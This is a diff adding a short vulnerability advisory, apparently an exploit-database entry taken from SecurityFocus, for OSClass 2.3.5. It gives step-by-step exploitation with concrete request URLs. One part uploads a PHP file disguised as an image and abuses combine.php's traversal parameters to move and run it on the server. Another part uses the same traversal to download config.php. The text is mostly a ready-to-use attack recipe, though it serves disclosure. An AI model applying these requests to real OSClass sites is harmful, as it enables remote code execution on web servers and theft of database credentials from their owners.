@@ -1,0 +1,43 @@
+source: http://www.securityfocus.com/bid/52336/info
+
+OSClass is prone to a directory-traversal vulnerability and an arbitrary-file-upload vulnerability.
+
+An attacker can exploit these issues to obtain sensitive information and to upload arbitrary code and run it in the context of the webserver process.
+
+OSClass 2.3.5 is vulnerable; prior versions may also be affected. 
+
+Arbitrary File Upload Vulnerability:
+
+1. Take a php file and rename it .gif (not really needed since OSClass trusts mime type)
+
+2. Upload that file as picture for a new item and get its name (is 5_small.jpg)
+
+3. Change useragent of your browser to: "Mozilla/4.0 (compatible; MSIE 5.0" . (needed to disable gzip encoding in combine.php)
+
+4. Use combine.php to move itself to oc-content/uploads
+http://www.example.com/osclass/oc-content/themes/modern/combine.php?type=./../../uploads/combine.php&files=combine.php
+now we have a copy of combine.php placed into uploads dir (the same dir where our malicius php file has been uploaded)
+
+5. Use uploads/combine.php to move 5_original.php to /remote.php
+http://www.example.com/osclass/oc-content/uploads/combine.php?files=5_original.jpg&type=/../../remote.php
+
+
+6. Run the uploaded php file
+http://www.example.com/osclass/remote.php
+
+
+
+
+Directory Traversal Vulnerability: 
+
+It is possible to download and arbitrary file (ie config.php) under the www root.
+
+1. Change useragent of your browser to: "Mozilla/4.0 (compatible; MSIE 5.0" . (needed to disable gzip encoding)
+
+2. Move combine.php into web root
+http://www.example.com/osclass/oc-content/themes/modern/combine.php?type=./../../../combine.php&files=combine.php
+
+3. Run combine to download config.php
+http://www.example.com/osclass/combine.php?files=config.php 
+
+
